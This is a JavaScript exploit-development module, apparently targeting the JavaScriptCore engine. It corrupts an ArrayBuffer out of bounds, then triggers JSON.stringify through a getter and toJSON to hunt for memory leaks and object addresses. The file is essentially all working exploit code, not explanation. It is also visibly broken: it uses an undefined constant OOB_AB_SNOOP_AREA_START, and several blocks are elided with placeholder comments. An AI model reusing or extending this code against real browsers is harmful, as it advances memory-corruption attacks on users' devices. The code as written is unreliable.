// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierLeak";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    leaks_in_oob_ab: []
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN = 0xCDCDCDCD;
const SNOOP_AREA_SIZE_FOR_LEAK = 0x800; // Sondar 2KB do oob_array_buffer_real

// Objeto global para tentar vazar o endereço
let object_for_addrof_test; 

class CheckpointForStringifierLeak {
    constructor(id) {
        this.id_marker = `StringLeakChkpt-${id}`;
        // Propriedade que conterá o objeto cujo endereço queremos vazar
        // Será preenchido antes de JSON.stringify
        this.prop_to_leak_via_stringify = null; 
        this.other_prop = "padding_string_" + "B".repeat(64);
        this.num_prop = 12345;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierLeak_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            success: false, message: "Getter chamado, sondando oob_ab por leaks do Stringifier.",
            error: null, leaks_in_oob_ab: []
        };
        let details_log_getter = [];

        try {
            if (!oob_array_buffer_real || !oob_read_absolute) {
                throw new Error("oob_array_buffer_real ou oob_read_absolute não disponíveis no getter.");
            }

            // JSON.stringify já processou (ou está processando) 'this' e suas propriedades, incluindo this.prop_to_leak_via_stringify.
            // Se o Stringifier corrompido escreveu OOB, pode ter atingido oob_array_buffer_real.

            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações/vazamentos...", "info", FNAME_GETTER);
            let potential_leaks_count = 0;
            const snoop_end = Math.min(SNOOP_AREA_SIZE_FOR_LEAK, oob_array_buffer_real.byteLength);

            for (let offset = 0; offset < snoop_end; offset += 4) { // Ler de 4 em 4 bytes
                if ((offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4)) {
                    // Logar o valor da corrupção mas não contar como leak inesperado
                    try {
                        const val_corr = oob_read_absolute(offset, 4);
                         current_test_results.leaks_in_oob_ab.push(`oob_data[${toHex(offset)}] (gatilho): ${toHex(val_corr)}`);
                    } catch(e){}
                    continue;
                }
                if ((offset + 4) > oob_array_buffer_real.byteLength) break;

                try {
                    const value_read_u32 = oob_read_absolute(offset, 4);
                    if (value_read_u32 !== OOB_AB_FILL_PATTERN) {
                        const leak_info = `VAZAMENTO/ALTERAÇÃO em oob_data[${toHex(offset)}]: ${toHex(value_read_u32)} (Esperado: ${toHex(OOB_AB_FILL_PATTERN)})`;
                        logS3(leak_info, "leak", FNAME_GETTER);
                        current_test_results.leaks_in_oob_ab.push(leak_info);
                        potential_leaks_count++;
                    }
                } catch (e_snoop) {
                    // Ignorar erros de leitura individuais, mas talvez logá-los
                    // details_log_getter.push(`Erro ao sondar oob_data[${toHex(offset)}]: ${e_snoop.message}`);
                }
            }

            if (potential_leaks_count > 0) {
                current_test_results.success = true;
                current_test_results.message = `Encontrado(s) ${potential_leaks_count} DWORDS alterado(s) no oob_array_buffer_real! Possível escrita OOB pelo Stringifier.`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
            } else {
                current_test_results.message = "Nenhuma alteração (escrita OOB pelo Stringifier) detectada no oob_array_buffer_real.";
                 logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "good", FNAME_GETTER);
            }
            current_test_results.details = details_log_getter.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_executed": true, "timestamp": Date.now() }; // Retorno do getter
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierLeak.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const getter_return_value = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        // O que JSON.stringify faz com o valor retornado pelo getter depende se o getter
        // é a propriedade que está sendo serializada ou se é chamado por um this.toJSON.
        // Aqui, é chamado por this.toJSON. O valor retornado pelo getter não é usado diretamente por stringify.
        return { // O que o toJSON retorna para o JSON.stringify
            id: this.id_marker, 
            prop_leak_value_type: Object.prototype.toString.call(this.prop_to_leak_via_stringify),
            processed_by_leak_test_toJSON: true
        };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST_RUNNER = "executeStringifierLeakTestRunner";
    logS3(`--- Iniciando Teste de Leak via Stringifier Corrompido ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Preencher oob_array_buffer_real com um padrão
        logS3(`Preenchendo oob_array_buffer_real com padrão ${toHex(OOB_AB_FILL_PATTERN)}...`, "info", FNAME_TEST_RUNNER);
        const fill_end_runner = Math.min(SNOOP_AREA_SIZE_FOR_LEAK + 0x100, oob_array_buffer_real.byteLength);
        for (let offset = OOB_AB_SNOOP_AREA_START; offset < fill_end_runner; offset += 4) {
             if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue;
             try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN, 4); } catch(e){}
        }
        logS3("oob_array_buffer_real preenchido.", "info", FNAME_TEST_RUNNER);

        // Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        // Criar o objeto checkpoint e definir a propriedade que queremos "expor" ao Stringifier
        const checkpoint_obj = new CheckpointForStringifierLeak(1);
        object_for_addrof_test = { "secret_data": 0xBADF00D, "unique_val": Math.random() }; // Tornar global para o getter acessar
        checkpoint_obj.prop_to_leak_via_stringify = object_for_addrof_test;
        logS3(`CheckpointForStringifierLeak objeto criado: ${checkpoint_obj.id_marker}, prop_to_leak_via_stringify definido.`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let stringify_final_result_str = "";
        try {
            stringify_final_result_str = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify completado. Resultado string: ${stringify_final_result_str}`, "info", FNAME_TEST_RUNNER);
        } catch (e) { 
            logS3(`Erro em JSON.stringify (externo): ${e.message}`, "error", FNAME_TEST_RUNNER);
            if(!getter_called_flag) { /* ... */ }
        }

    } catch (mainError) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRINGIFIER LEAK: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRINGIFIER LEAK: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.leaks_in_oob_ab && current_test_results.leaks_in_oob_ab.length > 0) {
            logS3("Conteúdo Alterado no oob_array_buffer_real:", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaks_in_oob_ab.forEach(info => {
                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) { /* ... */ }
    } else { /* ... */ }

    clearOOBEnvironment();
    object_for_addrof_test = null; // Limpar referência global
    logS3(`--- Teste de Leak via Stringifier Corrompido Concluído ---`, "test", FNAME_TEST_RUNNER);
}
